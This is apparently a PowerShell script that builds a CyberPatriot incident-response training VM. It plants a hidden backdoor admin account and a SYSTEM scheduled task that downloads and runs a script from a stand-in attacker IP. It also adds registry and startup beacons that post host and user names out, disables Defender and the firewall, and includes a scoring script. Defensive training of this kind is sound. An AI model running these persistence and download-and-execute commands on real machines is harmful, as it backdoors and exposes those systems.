# CyberPatriot Windows Incident Response Scenario Setup
# This script creates a Windows VM that simulates a post-attack scenario with
# persistence mechanisms, forensic artifacts, and security vulnerabilities
# Run as Administrator

# Set execution policy to allow script to run
Set-ExecutionPolicy Unrestricted -Force

Write-Host "Setting up CyberPatriot Windows Incident Response training VM..." -ForegroundColor Green

# 1. Initial System Setup
# --------------------
$MainUser = "ITAdmin"
$MainPassword = ConvertTo-SecureString "Company2023!" -AsPlainText -Force

# Create primary user with password
New-LocalUser -Name $MainUser -Password $MainPassword -FullName "IT Administrator" -Description "Primary IT administrator account"
Add-LocalGroupMember -Group "Administrators" -Member $MainUser

# Create legitimate users
$LegitUsers = @(
    @{Name = "JDoe"; Password = "Welcome2023!"; Groups = @("Users"); FullName = "John Doe"},
    @{Name = "SJohnson"; Password = "Regular22!"; Groups = @("Users"); FullName = "Sarah Johnson"},
    @{Name = "MSmith"; Password = "UserPass44!"; Groups = @("Users"); FullName = "Mike Smith"},
    @{Name = "ITSupport"; Password = "Support2023!"; Groups = @("Administrators"); FullName = "IT Support"}
)

foreach ($User in $LegitUsers) {
    $Password = ConvertTo-SecureString $User.Password -AsPlainText -Force
    New-LocalUser -Name $User.Name -Password $Password -FullName $User.FullName -Description "Company employee" -ErrorAction SilentlyContinue
    foreach ($Group in $User.Groups) {
        Add-LocalGroupMember -Group $Group -Member $User.Name -ErrorAction SilentlyContinue
    }
}

# 2. Simulate Attack - Initial Access Evidence
# -----------------------------------------
# Create Event Logs showing RDP brute force attempts
$AttackerIP = "192.168.1.100"

# Create Events Log directory if it doesn't exist
New-Item -Path "C:\Attack_Evidence" -ItemType Directory -Force | Out-Null

# Create a simulated Security Event Log CSV
@"
Level,Date and Time,Source,Event ID,Task Category,Description
Warning,$(Get-Date).AddDays(-3).ToString("MM/dd/yyyy HH:mm:ss"),Microsoft-Windows-Security-Auditing,4625,Logon,"An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: Administrator Account Domain: WORKSTATION Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Network Information: Workstation Name: - Source Network Address: $AttackerIP Source Port: 49523"
Warning,$(Get-Date).AddDays(-3).AddMinutes(1).ToString("MM/dd/yyyy HH:mm:ss"),Microsoft-Windows-Security-Auditing,4625,Logon,"An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: Administrator Account Domain: WORKSTATION Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Network Information: Workstation Name: - Source Network Address: $AttackerIP Source Port: 49525"
Warning,$(Get-Date).AddDays(-3).AddMinutes(2).ToString("MM/dd/yyyy HH:mm:ss"),Microsoft-Windows-Security-Auditing,4625,Logon,"An account failed to log on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 Account For Which Logon Failed: Security ID: S-1-0-0 Account Name: $MainUser Account Domain: WORKSTATION Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A Process Information: Caller Process ID: 0x0 Network Information: Workstation Name: - Source Network Address: $AttackerIP Source Port: 49527"
Information,$(Get-Date).AddDays(-3).AddMinutes(5).ToString("MM/dd/yyyy HH:mm:ss"),Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Type: 3 New Logon: Security ID: S-1-5-21-1234567890-1234567890-1234567890-1000 Account Name: $MainUser Account Domain: WORKSTATION Logon ID: 0x55427 Logon GUID: {00000000-0000-0000-0000-000000000000} Process Information: Process ID: 0x0 Process Name: - Network Information: Workstation Name: - Source Network Address: $AttackerIP Source Port: 49530"
"@ | Out-File -FilePath "C:\Attack_Evidence\security_log.csv" -Encoding UTF8

# 3. Attack Persistence #1 - Backdoor User Account
# ---------------------------------------------
# Create attacker user account
$AttackerUser = "svcmaintenance"
$AttackerPassword = ConvertTo-SecureString "Maint@1n!" -AsPlainText -Force

New-LocalUser -Name $AttackerUser -Password $AttackerPassword -FullName "Service Maintenance" -Description "Service account for automated maintenance" -ErrorAction SilentlyContinue
Add-LocalGroupMember -Group "Administrators" -Member $AttackerUser -ErrorAction SilentlyContinue

# Hide the user from the login screen by modifying registry
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $AttackerUser -Value 0 -PropertyType DWORD -Force | Out-Null

# 4. Attack Persistence #2 - Scheduled Tasks
# --------------------------------------
# Create a backdoor scheduled task
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"& {Invoke-WebRequest -Uri 'http://$AttackerIP/payload.ps1' -OutFile `$env:TEMP\update.ps1; powershell.exe -ExecutionPolicy Bypass -File `$env:TEMP\update.ps1}`""
$Trigger = New-ScheduledTaskTrigger -Daily -At "3:00AM"
$Settings = New-ScheduledTaskSettingsSet -Hidden
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsSystemUpdate" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "Windows system update service" -Force

# Create another hidden task for persistence
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c net user $AttackerUser Maint@1n! /add & net localgroup administrators $AttackerUser /add"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "SystemServices" -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal -Description "System services maintenance" -Force

# 5. Attack Persistence #3 - Registry Autoruns
# -----------------------------------------
# Create Registry autoruns
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemMonitor" -Value "powershell.exe -WindowStyle Hidden -Command `"while(`$true){Start-Sleep -Seconds 3600;Invoke-WebRequest -Uri 'http://$AttackerIP/beacon.php' -Method POST -Body @{hostname=`$env:COMPUTERNAME}}`"" -PropertyType STRING -Force | Out-Null

# 6. Attack Persistence #4 - Startup Folder
# --------------------------------------
# Create a backdoor startup script
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
New-Item -Path $StartupPath -ItemType Directory -Force | Out-Null

@"
@echo off
:: System monitoring service
powershell.exe -WindowStyle Hidden -Command "& {Start-Sleep -Seconds 30; Invoke-WebRequest -Uri 'http://$AttackerIP/monitor.php' -Method POST -Body @{host=\$env:COMPUTERNAME;user=\$env:USERNAME}}"
"@ | Out-File -FilePath "$StartupPath\system-monitor.bat" -Encoding ASCII

# 7. Vulnerable Software and Configurations
# --------------------------------------
# Enable Remote Desktop with weak security
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable firewall for all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Set weak password policies
secedit /export /cfg C:\secpol.cfg
(Get-Content C:\secpol.cfg) -replace "PasswordComplexity = 1", "PasswordComplexity = 0" | Out-File C:\secpol.cfg
(Get-Content C:\secpol.cfg) -replace "MinimumPasswordLength = 7", "MinimumPasswordLength = 3" | Out-File C:\secpol.cfg
secedit /configure /db C:\Windows\security\local.sdb /cfg C:\secpol.cfg /areas SECURITYPOLICY
Remove-Item C:\secpol.cfg -Force

# 8. Leaked Credentials and Sensitive Data
# -------------------------------------
# Create a folder with sensitive information
New-Item -Path "C:\Company_Data" -ItemType Directory -Force | Out-Null

# Database connection file
@"
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <connectionStrings>
    <add name="MainDB" connectionString="Server=db.company.local;Database=CompanyDB;User Id=sa;Password=Database@2023;" />
    <add name="ReportingDB" connectionString="Server=reporting.company.local;Database=ReportingDB;User Id=db_user;Password=Rep0rt1ngP@ss;" />
  </connectionStrings>
</configuration>
"@ | Out-File -FilePath "C:\Company_Data\database.config" -Encoding UTF8

# Create a file with API keys
@"
# Company API Configuration
# Last updated: $(Get-Date -Format "yyyy-MM-dd")

# Production API Keys
PROD_API_KEY=sk_live_prod_51JHy7LKjsdflKSJDFlksjdflKJSdlkfjsLKJDFgkl
PROD_API_SECRET=7gh65f43d21qwe09iuy8

# Development API Keys
DEV_API_KEY=sk_test_dev_51JHy7LKjsdflKSJDFlksjdflKJSdlkfjsLKJDFgkl
DEV_API_SECRET=dev87654321qwerty

# Payment Gateway Credentials
PAYMENT_USER=payment_admin
PAYMENT_PASS=P@ymentAdm1n
"@ | Out-File -FilePath "C:\Company_Data\api_keys.txt" -Encoding UTF8

# Create backup script with credentials
@"
# Automated Backup Script
# Run daily at 2AM

# FTP Server Credentials
\$FTP_SERVER = "ftp.company.local"
\$FTP_USER = "backup_user"
\$FTP_PASSWORD = "BackupP@ss123!"

# Connect to FTP and backup files
\$webclient = New-Object System.Net.WebClient
\$webclient.Credentials = New-Object System.Net.NetworkCredential(\$FTP_USER, \$FTP_PASSWORD)

# Backup database
\$date = Get-Date -Format "yyyy-MM-dd"
\$backupFile = "C:\Backups\db_backup_\$date.bak"
# Database backup command would go here

# Upload to FTP
\$remotePath = "ftp://\$FTP_SERVER/backups/db_backup_\$date.bak"
\$webclient.UploadFile(\$remotePath, \$backupFile)

Write-Host "Backup completed successfully"
"@ | Out-File -FilePath "C:\Company_Data\backup_script.ps1" -Encoding UTF8

# 9. Malware and Suspicious Files
# ----------------------------
# Create a fake malware file (not actually malicious)
$MalwarePath = "C:\ProgramData\WindowsService"
New-Item -Path $MalwarePath -ItemType Directory -Force | Out-Null

@"
@echo off
:: This is a simulated malware file for educational purposes
:: In a real attack, this could be a data exfiltration tool or ransomware dropper
echo This is a simulated malware file for the CyberPatriot training scenario.
echo In a real attack, this file would contain malicious code.
"@ | Out-File -FilePath "$MalwarePath\service.bat" -Encoding ASCII

# Create a PowerShell script that simulates a reverse shell
@"
# Simulated Reverse Shell (NOT ACTUALLY MALICIOUS)
# This is for educational purposes only

function Start-ReverseShell {
    param (
        [string]\$IPAddress = "$AttackerIP",
        [int]\$Port = 4444
    )
    
    Write-Host "This is a simulated reverse shell that would connect to \$IPAddress on port \$Port"
    Write-Host "In a real attack, this would establish a connection back to the attacker's machine"
    Write-Host "This script is for educational purposes only and does not contain actual malicious code"
}

# In a real attack scenario, this would execute automatically
# Start-ReverseShell
"@ | Out-File -FilePath "$MalwarePath\connector.ps1" -Encoding UTF8

# 10. Create README.txt with Scenario
# ------------------------------
@"
INCIDENT RESPONSE SCENARIO - CORPORATE WINDOWS WORKSTATION

Your company's Security Operations Center (SOC) has detected suspicious activity 
originating from this workstation over the past 48 hours. Network traffic analysis 
shows communication with a known malicious IP address (192.168.1.100), and there are 
signs of unauthorized access and potential data exfiltration.

As the incident response team, your tasks are:

1. Investigate the security breach and identify all methods of unauthorized access
2. Remove any backdoors or persistence mechanisms left by the attacker
3. Secure all vulnerable services and configurations according to company policy
4. Implement proper security measures to prevent future breaches
5. Document your findings and remediation steps

Company Security Policy Requirements:
- All user passwords must be strong and complex
- No unauthorized user accounts should exist on the system
- Remote Desktop must use Network Level Authentication
- Windows Defender and Firewall must be enabled with proper rules
- No unnecessary startup items or scheduled tasks should be running
- All sensitive data must be properly secured

FORENSIC QUESTIONS:
1. What IP address was used in the apparent brute force attack?
2. What user account was compromised in the initial attack?
3. Identify all persistence mechanisms the attacker installed on the system.
4. What sensitive information may have been compromised? List all files containing credentials.
5. What methods did the attacker use to maintain access to the system?

Good luck with your investigation!

- IT Security Team
"@ | Out-File -FilePath "C:\Users\Public\Desktop\README.txt" -Encoding UTF8

# 11. Create Scoring Script
# ---------------------
New-Item -Path "C:\Scoring" -ItemType Directory -Force | Out-Null

@"
# CyberPatriot Windows Incident Response Scoring Script
# Run as Administrator to check your progress

function Test-UserExists {
    param ([string]\$Username)
    return [bool](Get-LocalUser -Name \$Username -ErrorAction SilentlyContinue)
}

function Test-ScheduledTaskExists {
    param ([string]\$TaskName)
    return [bool](Get-ScheduledTask -TaskName \$TaskName -ErrorAction SilentlyContinue)
}

function Test-RegistryValue {
    param (
        [string]\$Path,
        [string]\$Name
    )
    if (Test-Path \$Path) {
        \$Value = Get-ItemProperty -Path \$Path -Name \$Name -ErrorAction SilentlyContinue
        return [bool](\$Value -ne \$null)
    }
    return \$false
}

function Test-FileExists {
    param ([string]\$Path)
    return [bool](Test-Path \$Path)
}

function Test-FirewallEnabled {
    \$profiles = Get-NetFirewallProfile
    return \$profiles | Where-Object { \$_.Enabled -eq \$false } | Measure-Object | Select-Object -ExpandProperty Count -eq 0
}

function Test-DefenderEnabled {
    \$status = Get-MpComputerStatus
    return \$status.RealTimeProtectionEnabled
}

function Test-RDPSecurityEnabled {
    \$rdpSetting = Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
    return \$rdpSetting.UserAuthentication -eq 1
}

function Test-PasswordPolicyStrong {
    \$secPol = secedit /export /cfg C:\Windows\Temp\secpol.cfg | Out-Null
    \$content = Get-Content C:\Windows\Temp\secpol.cfg
    \$minLength = \$content | Select-String "MinimumPasswordLength = "
    \$passwordComplexity = \$content | Select-String "PasswordComplexity = "
    Remove-Item C:\Windows\Temp\secpol.cfg -Force
    
    \$lengthValue = if (\$minLength -match "(\d+)") { [int]\$matches[1] } else { 0 }
    \$complexityValue = if (\$passwordComplexity -match "(\d+)") { [int]\$matches[1] } else { 0 }
    
    return (\$lengthValue -ge 8) -and (\$complexityValue -eq 1)
}

\$totalPoints = 0
\$earnedPoints = 0
\$results = @()

# Check for removed backdoor account
\$check = @{
    Name = "Removed backdoor user account"
    Points = 5
    Status = -not (Test-UserExists -Username "svcmaintenance")
    Message = if (-not (Test-UserExists -Username "svcmaintenance")) 
                { "Backdoor user account 'svcmaintenance' successfully removed" } 
              else 
                { "Backdoor user account 'svcmaintenance' still exists" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

# Check for removed malicious scheduled tasks
\$check = @{
    Name = "Removed WindowsSystemUpdate scheduled task"
    Points = 5
    Status = -not (Test-ScheduledTaskExists -TaskName "WindowsSystemUpdate")
    Message = if (-not (Test-ScheduledTaskExists -TaskName "WindowsSystemUpdate")) 
                { "Malicious scheduled task 'WindowsSystemUpdate' successfully removed" } 
              else 
                { "Malicious scheduled task 'WindowsSystemUpdate' still exists" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

\$check = @{
    Name = "Removed SystemServices scheduled task"
    Points = 5
    Status = -not (Test-ScheduledTaskExists -TaskName "SystemServices")
    Message = if (-not (Test-ScheduledTaskExists -TaskName "SystemServices")) 
                { "Malicious scheduled task 'SystemServices' successfully removed" } 
              else 
                { "Malicious scheduled task 'SystemServices' still exists" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

# Check for removed registry autoruns
\$check = @{
    Name = "Removed registry autorun entry"
    Points = 5
    Status = -not (Test-RegistryValue -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemMonitor")
    Message = if (-not (Test-RegistryValue -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemMonitor")) 
                { "Malicious registry autorun 'SystemMonitor' successfully removed" } 
              else 
                { "Malicious registry autorun 'SystemMonitor' still exists" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

# Check for removed startup script
\$startupFile = "\$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system-monitor.bat"
\$check = @{
    Name = "Removed startup script"
    Points = 5
    Status = -not (Test-FileExists -Path \$startupFile)
    Message = if (-not (Test-FileExists -Path \$startupFile)) 
                { "Malicious startup script successfully removed" } 
              else 
                { "Malicious startup script still exists" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

# Check for enabled Windows Defender
\$check = @{
    Name = "Enabled Windows Defender"
    Points = 5
    Status = Test-DefenderEnabled
    Message = if (Test-DefenderEnabled) 
                { "Windows Defender real-time protection is enabled" } 
              else 
                { "Windows Defender real-time protection is disabled" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

# Check for enabled firewall
\$check = @{
    Name = "Enabled Windows Firewall"
    Points = 5
    Status = Test-FirewallEnabled
    Message = if (Test-FirewallEnabled) 
                { "Windows Firewall is enabled for all profiles" } 
              else 
                { "Windows Firewall is disabled for one or more profiles" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

# Check for RDP security
\$check = @{
    Name = "Secured Remote Desktop"
    Points = 5
    Status = Test-RDPSecurityEnabled
    Message = if (Test-RDPSecurityEnabled) 
                { "Remote Desktop is configured to use Network Level Authentication" } 
              else 
                { "Remote Desktop is not using Network Level Authentication" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

# Check for password policy
\$check = @{
    Name = "Strong password policy"
    Points = 5
    Status = Test-PasswordPolicyStrong
    Message = if (Test-PasswordPolicyStrong) 
                { "Password policy is properly configured" } 
              else 
                { "Password policy is not properly configured" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

# Check for removed malware files
\$check = @{
    Name = "Removed malware files"
    Points = 5
    Status = -not (Test-FileExists -Path "C:\ProgramData\WindowsService\service.bat") -and -not (Test-FileExists -Path "C:\ProgramData\WindowsService\connector.ps1")
    Message = if (-not (Test-FileExists -Path "C:\ProgramData\WindowsService\service.bat") -and -not (Test-FileExists -Path "C:\ProgramData\WindowsService\connector.ps1")) 
                { "Malware files successfully removed" } 
              else 
                { "Malware files still exist on the system" }
}
\$totalPoints += \$check.Points
if (\$check.Status) { \$earnedPoints += \$check.Points }
\$results += \$check

# Display Results
Clear-Host
Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "      CyberPatriot Windows Incident Response Scoring" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Total Score: \$earnedPoints / \$totalPoints points (\$([math]::Round((\$earnedPoints / \$totalPoints) * 100))%)" -ForegroundColor Green
Write-Host ""
Write-Host "Vulnerability Fixes:" -ForegroundColor Cyan
Write-Host "---------------------" -ForegroundColor Cyan

foreach (\$result in \$results) {
    \$status = if (\$result.Status) { "[✓]" } else { "[✗]" }
    \$color = if (\$result.Status) { "Green" } else { "Red" }
    Write-Host "\$status \$(\$result.Name) (\$(\$result.Points) pts)" -ForegroundColor \$color
    Write-Host "     \$(\$result.Message)" -ForegroundColor White
}

Write-Host ""
Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "Total Score: \$earnedPoints / \$totalPoints points (\$([math]::Round((\$earnedPoints / \$totalPoints) * 100))%)" -ForegroundColor Green
Write-Host "======================================================" -ForegroundColor Cyan

# Create a shortcut to run this script
\$WshShell = New-Object -ComObject WScript.Shell
\$Shortcut = \$WshShell.CreateShortcut("\$env:Public\Desktop\Check Score.lnk")
\$Shortcut.TargetPath = "powershell.exe"
\$Shortcut.Arguments = "-ExecutionPolicy Bypass -File C:\Scoring\score.ps1"
\$Shortcut.WorkingDirectory = "C:\Scoring"
\$Shortcut.IconLocation = "C:\Windows\System32\SHELL32.dll,23"
\$Shortcut.Save()
"@ | Out-File -FilePath "C:\Scoring\score.ps1" -Encoding UTF8

# Create a shortcut on the desktop
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:Public\Desktop\Check Score.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-ExecutionPolicy Bypass -File C:\Scoring\score.ps1"
$Shortcut.WorkingDirectory = "C:\Scoring"
$Shortcut.IconLocation = "C:\Windows\System32\SHELL32.dll,23"
$Shortcut.Save()

Write-Host "Windows Incident Response VM setup complete!" -ForegroundColor Green
Write-Host ""
Write-Host "This VM simulates a post-attack scenario with various persistence mechanisms," -ForegroundColor White
Write-Host "backdoors, and security vulnerabilities for CyberPatriot competition training." -ForegroundColor White
Write-Host ""
Write-Host "To score your progress: Use the 'Check Score' shortcut on the desktop" -ForegroundColor White
Write-Host ""
Write-Host "NOTE: This is for educational purposes only. Do not use in production environments." -ForegroundColor Red

# Clean up
Set-ExecutionPolicy Restricted -Force -ErrorAction SilentlyContinue
